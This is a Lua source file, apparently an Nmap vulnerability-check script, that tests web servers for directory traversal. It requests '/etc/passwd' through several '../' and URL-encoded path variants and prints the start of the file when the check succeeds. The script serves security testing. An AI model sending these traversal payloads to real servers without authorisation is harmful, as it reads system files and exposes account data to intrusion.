description = [[
Checks if a web server is vulnerable to directory traversal by attempting to
retrieve <code>/etc/passwd</code> using various traversal methods such as
requesting <code>../../../../etc/passwd</code>.
]]

-- 07/20/2007:
--   * Used Thomas Buchanan's HTTPAuth script as a starting point
--   * Applied some great suggestions from Brandon Enright, thanks a lot man!
--
-- 01/31/2008:
--   * Rewritten to use Sven Klemm's excellent HTTP library and to do some much
--     needed cleaning up

author = "Kris Katterjohn"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"intrusive", "vuln"}

require "shortport"
require "http"

--- Validates the HTTP response code and checks for a <code>valid</code> passwd
-- format in the body.
--@param response The HTTP response from the server.
--@return The body of the HTTP response.
local validate = function(response)
	if not response.status then
		return nil
	end

	if response.status ~= 200 then
		return nil
	end

	if not response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") then
		return nil
	end

	return response.body
end

--- Transforms a string with ".", "/" and "\" converted to their URL-formatted
--- hex equivalents
--@param str String to hexify.
--@return Transformed string.
local hexify = function(str)
	local ret
	ret = str:gsub("%.", "%%2E")
	ret = ret:gsub("/", "%%2F")
	ret = ret:gsub("\\", "%%5C")
	return ret
end

--- Truncates the <code>passwd</code> file.
--@param passwd <code>passwd</code> file.
--@return Truncated passwd file and truncated length.
local truncatePasswd = function(passwd)
	local len = 250
	return passwd:sub(1, len), len
end

--- Formats output.
--@param passwd <code>passwd</code> file.
--@param dir Formatted request which elicited the good reponse.
--@return String description for output
local output = function(passwd, dir)
	local trunc, len = truncatePasswd(passwd)
	local out = ""
	out = out .. "Found with \"" .. dir .. "\"\n"
	out = out .. "Printing first " .. len .. " bytes:\n"
	out = out .. trunc
	return out
end

portrule = shortport.port_or_service({80, 443, 8080}, {"http", "https"})

action = function(host, port)
	local dirs = {
		"//etc/passwd",
		string.rep("../", 10) .. "etc/passwd",
		"." .. string.rep("../", 10) .. "etc/passwd",
		string.rep("..\\/", 10) .. "etc\\/passwd",
		string.rep("..\\", 10) .. "etc\\passwd"
	}

	for _, dir in ipairs(dirs) do
		local response = http.get(host, port, hexify(dir))

		if validate(response) then
			return output(response.body, dir)
		end
	end

	return
end

